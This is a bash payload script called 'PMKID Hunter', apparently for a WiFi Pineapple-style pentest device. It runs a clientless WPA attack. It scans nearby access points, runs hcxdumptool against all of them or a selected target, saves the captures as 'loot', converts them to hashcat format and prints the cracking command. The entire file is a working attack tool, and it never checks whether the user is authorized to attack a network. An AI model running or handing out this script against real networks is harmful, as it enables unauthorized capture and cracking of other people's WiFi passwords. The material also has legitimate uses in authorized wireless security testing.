#!/bin/bash
# Title: PMKID Hunter
# Description: Clientless WPA attack - capture PMKIDs without waiting for handshakes
# Author: JMFH / FENRIR / HaleHound
# Version: 1.0.3
# Category: user/attack
# Requires: hcxdumptool, hcxpcapngtool (hcxtools)
#
# PMKID Attack: Captures the PMKID from the AP's first EAPOL message
# No client connection needed - works even on empty networks
# Output: Hashcat-ready .22000 files for offline cracking

# === CONFIGURATION ===
LOOTDIR="/root/loot/pmkid"
INTERFACE="wlan1mon"
INPUT=/dev/input/event0

# === CLEANUP ===
cleanup() {
    pkill -9 -f "hcxdumptool" 2>/dev/null
    rm -f /tmp/pmkid_running /tmp/pmkid_status
    LED WHITE
}

trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_hunting() {
    LED MAGENTA
}

led_capturing() {
    LED AMBER
}

led_success() {
    LED GREEN
}

led_error() {
    LED RED
}

# === SOUNDS ===
play_start() {
    RINGTONE "start:d=4,o=5,b=200:c6,e6,g6" &
}

play_capture() {
    RINGTONE "cap:d=8,o=6,b=180:g,a,b" &
}

play_success() {
    RINGTONE "success:d=4,o=5,b=180:c6,e6,g6,c7" &
}

play_fail() {
    RINGTONE "fail:d=4,o=4,b=120:g,e,c" &
}

# === TOOL CHECK ===
check_tools() {
    local missing=""

    if ! command -v hcxdumptool >/dev/null 2>&1; then
        missing="hcxdumptool"
    fi

    if ! command -v hcxpcapngtool >/dev/null 2>&1; then
        if [ -n "$missing" ]; then
            missing="$missing, hcxpcapngtool"
        else
            missing="hcxpcapngtool"
        fi
    fi

    if [ -n "$missing" ]; then
        return 1
    fi
    return 0
}

install_tools() {
    LOG "Installing hcxdumptool and hcxtools..."
    LOG ""
    LOG "Updating package lists..."
    timeout 60 opkg update >/dev/null 2>&1
    LOG "Installing hcxdumptool..."
    timeout 120 opkg install hcxdumptool >/dev/null 2>&1
    LOG "Installing hcxtools..."
    timeout 120 opkg install hcxtools >/dev/null 2>&1
    LOG ""

    if check_tools; then
        LOG "Tools installed successfully"
        return 0
    else
        LOG "Installation failed"
        return 1
    fi
}

# === TARGET SELECTION ===
declare -a AP_MACS
declare -a AP_SSIDS
declare -a AP_CHANNELS
SELECTED=0
TOTAL_APS=0

scan_targets() {
    LOG "Scanning for targets..."
    SCAN_ID=$(START_SPINNER "Scanning APs...")

    local json=$(_pineap RECON APS limit=30 format=json)

    STOP_SPINNER "$SCAN_ID"

    AP_MACS=()
    AP_SSIDS=()
    AP_CHANNELS=()

    while read -r mac; do
        AP_MACS+=("$mac")
    done < <(echo "$json" | grep -o '"mac":"[^"]*"' | sed 's/"mac":"//;s/"//')

    while read -r ssid; do
        [ -z "$ssid" ] && ssid="[Hidden]"
        AP_SSIDS+=("$ssid")
    done < <(echo "$json" | grep -o '"ssid":"[^"]*"' | head -30 | sed 's/"ssid":"//;s/"//')

    while read -r ch; do
        AP_CHANNELS+=("$ch")
    done < <(echo "$json" | grep -o '"channel":[0-9]*' | head -30 | sed 's/"channel"://')

    TOTAL_APS=${#AP_MACS[@]}

    if [ $TOTAL_APS -eq 0 ]; then
        LOG "No targets found"
        LOG "Start Recon first"
        return 1
    fi
    LOG "Found $TOTAL_APS targets"
    return 0
}

show_target() {
    LOG ""
    LOG "[$((SELECTED + 1))/$TOTAL_APS] ${AP_SSIDS[$SELECTED]}"
    LOG "${AP_MACS[$SELECTED]}"
    LOG "Channel: ${AP_CHANNELS[$SELECTED]}"
    LOG ""
    LOG "UP/DOWN=Scroll A=Select B=Back"
}

select_target() {
    SELECTED=0
    show_target

    while true; do
        local btn=$(WAIT_FOR_INPUT)
        case "$btn" in
            UP|LEFT)
                SELECTED=$((SELECTED - 1))
                [ $SELECTED -lt 0 ] && SELECTED=$((TOTAL_APS - 1))
                show_target
                ;;
            DOWN|RIGHT)
                SELECTED=$((SELECTED + 1))
                [ $SELECTED -ge $TOTAL_APS ] && SELECTED=0
                show_target
                ;;
            A)
                return 0
                ;;
            B|BACK)
                return 1
                ;;
        esac
    done
}

# === PMKID CAPTURE ===
capture_pmkid() {
    local mode=$1
    local target_mac=$2
    local target_channel=$3
    local duration=$4

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local capfile="$LOOTDIR/pmkid_${timestamp}.pcapng"
    local hashfile="$LOOTDIR/pmkid_${timestamp}.22000"
    local bpffile="/tmp/pmkid_target.bpf"

    mkdir -p "$LOOTDIR"

    LOG ""
    LOG "=== PMKID HUNTER ==="
    LOG ""

    if [ "$mode" = "targeted" ]; then
        LOG "Target: $target_mac"
        LOG "Channel: $target_channel"
    else
        LOG "Mode: Scan ALL APs"
    fi

    LOG "Duration: ${duration}s"
    LOG "Output: $capfile"
    LOG ""
    LOG "A = Stop capture"
    LOG ""

    led_capturing
    play_start
    VIBRATE

    # Build hcxdumptool command
    local cmd="hcxdumptool -i $INTERFACE -w $capfile --rds=1"

    if [ "$mode" = "targeted" ]; then
        # Create filter file for target MAC
        echo "$target_mac" > "$bpffile"
        cmd="$cmd --filterlist_ap=$bpffile --filtermode=2"

        # Lock to target channel (add band indicator)
        if [ -n "$target_channel" ]; then
            if [ "$target_channel" -le 14 ]; then
                cmd="$cmd -c ${target_channel}a"  # 2.4GHz band
            else
                cmd="$cmd -c ${target_channel}b"  # 5GHz band
            fi
        fi
    else
        # Scan all frequencies
        cmd="$cmd -F"
    fi

    # Start capture in background
    LOG "Starting PMKID capture..."
    $cmd > /tmp/pmkid_status 2>&1 &
    local cap_pid=$!

    sleep 1

    if ! kill -0 $cap_pid 2>/dev/null; then
        led_error
        play_fail
        LOG "Capture failed to start"
        cat /tmp/pmkid_status
        return 1
    fi

    # Monitor capture with countdown
    local elapsed=0
    local pmkid_count=0
    local last_status=""

    while [ $elapsed -lt $duration ]; do
        if check_for_stop; then
            LOG "Stopping capture..."
            kill -9 $cap_pid 2>/dev/null
            break
        fi

        if ! kill -0 $cap_pid 2>/dev/null; then
            LOG "Capture ended"
            break
        fi

        # Check for PMKID captures in output
        local status=$(tail -5 /tmp/pmkid_status 2>/dev/null | grep -i "pmkid" | tail -1)
        if [ -n "$status" ] && [ "$status" != "$last_status" ]; then
            play_capture
            VIBRATE 50
            led_success
            pmkid_count=$((pmkid_count + 1))
            LOG "PMKID #$pmkid_count captured!"
            last_status="$status"
            sleep 0.2
            led_capturing
        fi

        local remaining=$((duration - elapsed))
        LOG "[${remaining}s] Hunting PMKIDs... ($pmkid_count captured)"

        sleep 1
        elapsed=$((elapsed + 1))
    done

    # Stop capture
    kill -9 $cap_pid 2>/dev/null
    wait $cap_pid 2>/dev/null

    LOG ""
    LOG ""
    LOG "Capture complete"

    # Check if we got anything
    if [ ! -f "$capfile" ] || [ ! -s "$capfile" ]; then
        led_error
        play_fail
        LOG "No capture file created"
        rm -f "$bpffile"
        return 1
    fi

    # Convert to hashcat format
    LOG "Converting to hashcat format..."
    CONV_ID=$(START_SPINNER "Converting...")

    hcxpcapngtool -o "$hashfile" -E "$LOOTDIR/essid_${timestamp}.txt" "$capfile" 2>/tmp/convert_status

    STOP_SPINNER "$CONV_ID"

    # Count results
    local hash_count=0
    if [ -f "$hashfile" ] && [ -s "$hashfile" ]; then
        hash_count=$(wc -l < "$hashfile")
    fi

    rm -f "$bpffile"

    # Results
    LOG ""
    LOG "=== RESULTS ==="

    if [ $hash_count -gt 0 ]; then
        led_success
        play_success
        VIBRATE
        VIBRATE

        LOG "PMKIDs captured: $hash_count"
        LOG ""
        LOG "Files saved:"
        LOG "  PCAP: $capfile"
        LOG "  Hash: $hashfile"
        LOG ""
        LOG "Crack with:"
        LOG "  hashcat -m 22000 $hashfile wordlist.txt"

        ALERT "PMKID CAPTURE SUCCESS!\n\nCaptured: $hash_count PMKIDs\n\nFiles saved to:\n$LOOTDIR\n\nReady for hashcat -m 22000"

        return 0
    else
        led_error
        play_fail

        LOG "No PMKIDs captured"
        LOG ""
        LOG "Possible reasons:"
        LOG "  - AP doesn't support PMKID"
        LOG "  - WPA3-only network"
        LOG "  - Out of range"
        LOG "  - Try longer duration"

        # Keep pcap anyway - might have handshakes
        if [ -f "$capfile" ] && [ -s "$capfile" ]; then
            LOG ""
            LOG "PCAP saved (may contain handshakes):"
            LOG "  $capfile"
        fi

        ALERT "No PMKIDs Captured\n\nTry:\n- Longer duration\n- Different target\n- Move closer to AP"

        return 1
    fi
}

# === MAIN ===

LOG ""
LOG "  ____  __  __ _  _____ ____  "
LOG " |  _ \\|  \\/  | |/ /_ _|  _ \\ "
LOG " | |_) | |\\/| | ' / | || | | |"
LOG " |  __/| |  | | . \\ | || |_| |"
LOG " |_|   |_|  |_|_|\\_\\___|____/ "
LOG "         HUNTER v1.0"
LOG ""
LOG "Clientless WPA Attack"
LOG ""

# Check for required tools
if ! check_tools; then
    LOG "Required tools not installed"

    install_confirm=$(CONFIRMATION_DIALOG "Install hcxdumptool and hcxtools?\n\nRequired for PMKID attacks")
    case $? in
        $DUCKYSCRIPT_CANCELLED)
            LOG "Cancelled"
            exit 1
            ;;
        $DUCKYSCRIPT_REJECTED)
            LOG "Rejected"
            exit 1
            ;;
        $DUCKYSCRIPT_ERROR)
            LOG "Error"
            exit 1
            ;;
    esac

    if [ "$install_confirm" = "1" ]; then
        if ! install_tools; then
            ERROR_DIALOG "Failed to install tools\n\nTry manually:\nopkg update\nopkg install hcxdumptool hcxtools"
            exit 1
        fi
    else
        LOG "Tools required - exiting"
        exit 1
    fi
fi

LOG "Tools ready"
LOG ""

# Mode selection
mode_choice=$(CONFIRMATION_DIALOG "Scan ALL nearby APs?\n\nYes = Capture from all APs\nNo = Select specific target")
case $? in
    $DUCKYSCRIPT_CANCELLED)
        LOG "Cancelled"
        exit 1
        ;;
    $DUCKYSCRIPT_REJECTED)
        LOG "Rejected"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "Error"
        exit 1
        ;;
esac

TARGET_MODE="all"
TARGET_MAC=""
TARGET_CHANNEL=""

if [ "$mode_choice" != "1" ]; then
    TARGET_MODE="targeted"

    # Scan for targets
    if ! scan_targets; then
        ERROR_DIALOG "No targets found\n\nStart Recon scan first"
        exit 1
    fi

    # Let user pick target
    if ! select_target; then
        LOG "Cancelled"
        exit 0
    fi

    TARGET_MAC="${AP_MACS[$SELECTED]}"
    TARGET_CHANNEL="${AP_CHANNELS[$SELECTED]}"

    LOG "Selected: ${AP_SSIDS[$SELECTED]}"
    LOG "MAC: $TARGET_MAC"
    LOG "Channel: $TARGET_CHANNEL"
fi

# Duration selection
duration=$(NUMBER_PICKER "Capture duration (seconds)" 60)
case $? in
    $DUCKYSCRIPT_CANCELLED)
        LOG "Cancelled"
        exit 1
        ;;
    $DUCKYSCRIPT_REJECTED)
        LOG "Rejected"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "Error"
        exit 1
        ;;
esac

# Confirm and start
confirm_msg="Start PMKID Hunt?\n\nMode: "
if [ "$TARGET_MODE" = "all" ]; then
    confirm_msg="${confirm_msg}Scan ALL APs"
else
    confirm_msg="${confirm_msg}Target ${AP_SSIDS[$SELECTED]}"
fi
confirm_msg="${confirm_msg}\nDuration: ${duration}s"

confirm=$(CONFIRMATION_DIALOG "$confirm_msg")
case $? in
    $DUCKYSCRIPT_CANCELLED)
        LOG "Cancelled"
        exit 1
        ;;
    $DUCKYSCRIPT_REJECTED)
        LOG "Rejected"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "Error"
        exit 1
        ;;
esac

if [ "$confirm" != "1" ]; then
    LOG "Cancelled by user"
    exit 0
fi

# Run capture
led_hunting
capture_pmkid "$TARGET_MODE" "$TARGET_MAC" "$TARGET_CHANNEL" "$duration"

LED WHITE
LOG ""
LOG "PMKID Hunter complete"
